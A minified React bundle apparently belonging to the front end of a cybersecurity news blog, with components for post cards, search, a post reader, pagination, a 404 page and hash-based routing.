x.jsx(tt.div,{variants:o,whileHover:"hover",className:"h-full group",children:x.jsxs(fm,{className:`flex flex-col h-full ${a} transition-all duration-300 shadow-md hover:shadow-xl rounded-xl overflow-hidden`,children:[x.jsxs(gm,{className:"p-0",children:[x.jsx("div",{className:"mb-4 h-48 w-full overflow-hidden",children:x.jsx("a",{href:f,"aria-label":`Read more about ${n.title}`,children:x.jsx("img",{className:"w-full h-full object-cover transition-transform duration-300 group-hover:scale-105",alt:`Blog post illustration for ${n.title}`,src:g})})}),x.jsxs("div",{className:"p-6",children:[x.jsx(mm,{className:`text-xl font-semibold ${c} transition-colors`,children:x.jsx("a",{href:f,children:n.title})}),x.jsxs(ym,{className:`${p} text-xs flex flex-wrap items-center gap-x-3 gap-y-1 mt-2`,children:[x.jsxs("span",{className:"flex items-center",children:[x.jsx(Of,{size:14,className:"mr-1"})," ",n.date]}),x.jsxs("span",{className:"flex items-center",children:[x.jsx(_f,{size:14,className:"mr-1"})," ",n.author]})]})]})]}),x.jsx(vm,{className:"flex-grow px-6 pb-4",children:x.jsx("p",{className:`${d} leading-relaxed text-sm`,children:n.summary})}),x.jsx(bm,{className:"px-6 pb-6",children:x.jsx(Cn,{asChild:!0,variant:"link",className:`${h} p-0 text-sm`,children:x.jsxs("a",{href:f,className:"flex items-center font-semibold",children:["Read More ",x.jsx(Vf,{size:16,className:"ml-1"})]})})})]})})};function j1(...n){return af(ac(n))}const Bc=Te.forwardRef(({className:n,type:r,...o},a)=>x.jsx("input",{type:r,className:j1("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",n),ref:a,...o}));Bc.displayName="Input";const Vl=6,B1=()=>{const{theme:n}=Xn(),[r,o]=I.useState(""),[a,c]=I.useState([]),p=I.useMemo(()=>[...jc].sort((P,O)=>new Date(O.date)-new Date(P.date)),[]),d=I.useMemo(()=>r?p.filter(P=>P.title.toLowerCase().includes(r.toLowerCase())||P.summary.toLowerCase().includes(r.toLowerCase())||P.tags&&P.tags.some(O=>O.toLowerCase().includes(r.toLowerCase()))):p.slice(0,Vl),[r,p]);I.useEffect(()=>{c(r?d:p.slice(0,Vl))},[r,p,d]);const h=P=>{o(P.target.value)},g=()=>{o("")},f={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},y=n==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",v=n==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",w=n==="dark"?"text-slate-400":"text-muted-foreground",T=n==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",M=n==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return x.jsxs("div",{className:"space-y-12",children:[x.jsxs(tt.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${y} rounded-xl shadow-lg p-8`,children:[x.jsx("h1",{className:`text-5xl md:text-6xl font-bold mb-6 ${v}`,children:"CyberSec Insights"}),x.jsx("p",{className:`text-lg md:text-xl ${w} max-w-3xl mx-auto mb-10`,children:"Your trusted source for the latest in cybersecurity news, threats, and best practices. Stay informed, stay secure."}),x.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[x.jsx(zf,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${M} transition-colors`}),x.jsx(Bc,{type:"search",placeholder:"Search recent articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${T}`,value:r,onChange:h}),r&&x.jsx("button",{onClick:g,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:x.jsx(ss,{size:20})})]})]}),r&&a.length>0&&x.jsxs(tt.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[x.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",x.jsx("span",{className:"text-primary",children:r})]}),x.jsxs("p",{className:"text-muted-foreground",children:[a.length," post(s) found."]})]}),a.length===0&&x.jsxs(tt.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[x.jsx(ss,{size:48,className:"mx-auto text-destructive mb-4"}),x.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),x.jsx("p",{className:"text-muted-foreground",children:r?`Sorry, we couldn't find any articles matching "${r}". Try a different search term or view all posts.`:"There are no recent articles available. Check back soon!"})]}),a.length>0&&x.jsx(tt.section,{variants:f,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:a.map(P=>x.jsx(wm,{post:P},P.id))}),!r&&p.length>Vl&&x.jsx(tt.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:.3},className:"text-center mt-12",children:x.jsx(Cn,{asChild:!0,size:"lg",className:"bg-primary hover:bg-primary/90 text-primary-foreground shadow-md hover:shadow-lg transition-all",children:x.jsxs("a",{href:"#/all-blogs",children:["View All Posts ",x.jsx(Vf,{size:20,className:"ml-2"})]})})})]})},km=()=>{const{theme:n}=Xn(),r=n==="dark"?"text-amber-400":"text-amber-500",o=n==="dark"?"text-red-400":"text-red-500",a=n==="dark"?"text-slate-300":"text-foreground/90",c=n==="dark"?"text-slate-400":"text-muted-foreground",p=n==="dark"?"text-background bg-sky-400 hover:bg-sky-500 hover:shadow-sky-500/50":"text-primary-foreground bg-primary hover:bg-primary/90 hover:shadow-primary/30";return x.jsxs(tt.div,{initial:{opacity:0,scale:.9},animate:{opacity:1,scale:1},transition:{duration:.5},className:"flex flex-col items-center justify-center min-h-[70vh] text-center p-6",children:[x.jsx(tt.div,{initial:{y:-20,opacity:0},animate:{y:0,opacity:1},transition:{delay:.2,type:"spring",stiffness:120},children:x.jsx(Zb,{className:`mx-auto h-24 w-24 ${r} mb-6`})}),x.jsx("h1",{className:`text-6xl font-extrabold ${o} mb-4`,children:"404"}),x.jsx("h2",{className:`text-3xl font-semibold ${a} mb-6`,children:"Content Not Found"}),x.jsx("p",{className:`text-lg ${c} max-w-md mx-auto mb-8`,children:"Oops! The content you're looking for at this URL path doesn't exist. It might have been moved or the link is incorrect."}),x.jsxs("a",{href:"#/",className:`inline-flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md ${p} transition-all shadow-lg`,children:[x.jsx(rw,{size:20,className:"mr-2"}),"Go Back Home"]})]})},F1=({postId:n})=>{const{theme:r}=Xn(),[o,a]=I.useState(null),[c,p]=I.useState(!0),[d,h]=I.useState("");I.useEffect(()=>{p(!0);const N=N1(n);a(N),N&&h(gs[N.imageKey]||gs.default),p(!1),window.scrollTo(0,0)},[n]);const g=r==="dark"?"bg-card":"bg-background",f="text-primary hover:text-primary/80",y=r==="dark"?"border-slate-700/50":"border-border",v=r==="dark"?"text-primary":"text-foreground",w=r==="dark"?"text-slate-400":"text-muted-foreground",T=r==="dark"?"text-accent":"text-primary",M=r==="dark"?"bg-secondary text-primary/90":"bg-secondary text-secondary-foreground",A=r==="dark"?"text-slate-300":"text-foreground/90",P=r==="dark"?"prose-invert":"",O="border-primary",L="bg-primary hover:bg-primary/90 text-primary-foreground";return c?x.jsx("div",{className:"flex justify-center items-center min-h-[60vh]",children:x.jsx("div",{className:`animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 ${O}`})}):o?x.jsxs(tt.article,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.5},className:`max-w-3xl mx-auto ${g} p-6 sm:p-8 md:p-10 rounded-xl ${r==="light"?"shadow-xl":"shadow-2xl"}`,children:[x.jsx("div",{className:"mb-8",children:x.jsxs("a",{href:"#/all-blogs",className:`inline-flex items-center ${f} transition-colors mb-6 group font-semibold text-sm`,children:[x.jsx(Jb,{size:18,className:"mr-2 group-hover:-translate-x-1 transition-transform"}),"Back to Blog"]})}),x.jsxs("header",{className:`mb-8 border-b ${y} pb-8`,children:[x.jsx("h1",{className:`text-3xl md:text-4xl font-bold mb-4 ${v} leading-tight`,children:o.title}),x.jsxs("div",{className:`flex flex-wrap items-center gap-x-4 gap-y-2 ${w} text-sm`,children:[x.jsxs("span",{className:"flex items-center",children:[x.jsx(Of,{size:16,className:`mr-1.5 ${T}`})," Published on ",o.date]}),x.jsxs("span",{className:"flex items-center",children:[x.jsx(_f,{size:16,className:`mr-1.5 ${T}`})," By ",o.author]})]}),o.tags&&o.tags.length>0&&x.jsxs("div",{className:"mt-4 flex flex-wrap items-center gap-2",children:[x.jsx(sw,{size:16,className:`${T}`}),o.tags.map(N=>x.jsx("span",{className:`px-2.5 py-1 ${M} text-xs rounded-full font-medium`,children:N},N))]})]}),d&&x.jsx("div",{className:"mb-8 h-64 md:h-80 w-full overflow-hidden rounded-lg shadow-md",children:x.jsx("img",{className:"w-full h-full object-cover",alt:`Illustration for ${o.title}`,src:d})}),x.jsx("div",{className:`prose ${P} prose-base md:prose-lg max-w-none content-area ${A}`,dangerouslySetInnerHTML:{__html:o.content}}),x.jsxs(tt.div,{initial:{opacity:0},animate:{opacity:1},transition:{delay:.5,duration:.5},className:`mt-12 pt-8 border-t ${y} text-center`,children:[x.jsx("p",{className:`${w} mb-4 text-sm`,children:"Enjoyed this article? Share it with your network!"}),x.jsx("a",{href:"#/",className:`inline-flex items-center justify-center px-5 py-2.5 border border-transparent text-sm font-medium rounded-md ${L} transition-colors shadow-md hover:shadow-lg`,children:"Explore More Articles"})]})]}):x.jsx(km,{})},V1=({currentPage:n,totalPages:r,onPageChange:o})=>{const a=()=>{n>1&&o(n-1)},c=()=>{n<r&&o(n+1)};if(r<=1)return null;const p=[],d=5;let h=Math.max(1,n-Math.floor(d/2)),g=Math.min(r,h+d-1);g-h+1<d&&(h=Math.max(1,g-d+1));for(let f=h;f<=g;f++)p.push(f);return x.jsxs("div",{className:"flex items-center justify-center space-x-2 mt-12",children:[x.jsx(Cn,{variant:"outline",size:"icon",onClick:a,disabled:n===1,"aria-label":"Go to previous page",children:x.jsx(ew,{className:"h-5 w-5"})}),h>1&&x.jsxs(x.Fragment,{children:[x.jsx(Cn,{variant:"outline",onClick:()=>o(1),children:"1"}),h>2&&x.jsx("span",{className:"text-muted-foreground",children:"..."})]}),p.map(f=>x.jsx(Cn,{variant:n===f?"default":"outline",onClick:()=>o(f),"aria-current":n===f?"page":void 0,children:f},f)),g<r&&x.jsxs(x.Fragment,{children:[g<r-1&&x.jsx("span",{className:"text-muted-foreground",children:"..."}),x.jsx(Cn,{variant:"outline",onClick:()=>o(r),children:r})]}),x.jsx(Cn,{variant:"outline",size:"icon",onClick:c,disabled:n===r,"aria-label":"Go to next page",children:x.jsx(tw,{className:"h-5 w-5"})})]})},Ol=9,O1=()=>{const{theme:n}=Xn(),[r,o]=I.useState(1),[a,c]=I.useState(""),[p,d]=I.useState([]),h=I.useMemo(()=>{let L=[...jc];return a&&(L=L.filter(N=>N.title.toLowerCase().includes(a.toLowerCase())||N.summary.toLowerCase().includes(a.toLowerCase())||N.tags&&N.tags.some(B=>B.toLowerCase().includes(a.toLowerCase())))),L.sort((N,B)=>new Date(B.date)-new Date(N.date))},[a]),g=Math.ceil(h.length/Ol);I.useEffect(()=>{const L=(r-1)*Ol,N=L+Ol;d(h.slice(L,N)),(a||r>1)&&window.scrollTo({top:0,behavior:"smooth"})},[r,h,a]);const f=L=>{o(L)},y=L=>{c(L.target.value),o(1)},v=()=>{c(""),o(1)},w={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},T=n==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",M=n==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",A=n==="dark"?"text-slate-400":"text-muted-foreground",P=n==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",O=n==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return x.jsxs("div",{className:"space-y-12",children:[x.jsxs(tt.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${T} rounded-xl shadow-lg p-8`,children:[x.jsx(Ff,{size:48,className:`mx-auto mb-4 ${M}`}),x.jsx("h1",{className:`text-4xl md:text-5xl font-bold mb-6 ${M}`,children:"All Blog Posts"}),x.jsx("p",{className:`text-lg md:text-xl ${A} max-w-3xl mx-auto mb-10`,children:"Browse through our entire collection of articles. Use the search to find specific topics."}),x.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[x.jsx(zf,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${O} transition-colors`}),x.jsx(Bc,{type:"search",placeholder:"Search all articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${P}`,value:a,onChange:y}),a&&x.jsx("button",{onClick:v,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:x.jsx(ss,{size:20})})]})]}),a&&h.length>0&&x.jsxs(tt.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[x.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",x.jsx("span",{className:"text-primary",children:a})]}),x.jsxs("p",{className:"text-muted-foreground",children:[h.length," post(s) found."]})]}),h.length===0&&x.jsxs(tt.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[x.jsx(ss,{size:48,className:"mx-auto text-destructive mb-4"}),x.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),x.jsx("p",{className:"text-muted-foreground",children:a?`Sorry, we couldn't find any articles matching "${a}". Try a different search term.`:"There are no articles available at the moment. Check back soon!"})]}),p.length>0&&x.jsx(tt.section,{variants:w,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:p.map(L=>x.jsx(wm,{post:L},L.id))}),g>1&&p.length>0&&x.jsx(V1,{currentPage:r,totalPages:g,onPageChange:f})]})},z1=()=>{const[n,r]=I.useState(window.location.hash||"#/"),[o,a]=I.useState(null);I.useEffect(()=>{const d=()=>{const h=window.location.hash||"#/";r(h),h.startsWith("#/post/")?a(h.substring(7)):a(null)};return window.addEventListener("hashchange",d),d(),()=>{window.removeEventListener("hashchange",d)}},[]);let c,p={};return n==="#/"||n==="#"?c=B1:n==="#/all-blogs"?c=O1:n.startsWith("#/post/")&&o?(c=F1,p={postId:o}):c=km,x.jsxs(Iv,{defaultTheme:"light",storageKey:"cyberblog-theme",children:[x.jsx(R1,{routeKey:n,children:x.jsx(c,{...p})}),x.jsx(vw,{})]})};Ev.createRoot(document.getElementById("root")).render(x.jsx(Te.StrictMode,{children:x.jsx(z1,{})}));
